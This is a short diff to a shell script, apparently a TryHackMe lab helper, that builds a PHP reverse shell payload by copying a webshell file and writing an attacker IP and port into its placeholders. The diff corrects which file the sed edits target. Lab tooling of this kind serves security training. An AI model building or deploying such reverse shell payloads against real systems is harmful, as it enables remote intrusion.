@@ -13,8 +13,8 @@ fi
 cp /tmp/Rshells/webshells/php-reverse-shell.php /tmp/rshell-payload.php
 
 # Use sed to replace placeholders in the file
-sed -i "s/THM_ATTACKBOX_IP_HERE/${valueA}/" /tmp/Rshells/Payloads/rshell.php
-sed -i "s/THM_ATTACKBOX_PORT_HERE/${valueB}/" /tmp/Rshells/Payloads/rshell.php
+sed -i "s/THM_ATTACKBOX_IP_HERE/${valueA}/" /tmp/rshell-payload.php
+sed -i "s/THM_ATTACKBOX_PORT_HERE/${valueB}/" /tmp/rshell-payload.php
 
 # Finished output
 echo "Your payload has been created:"
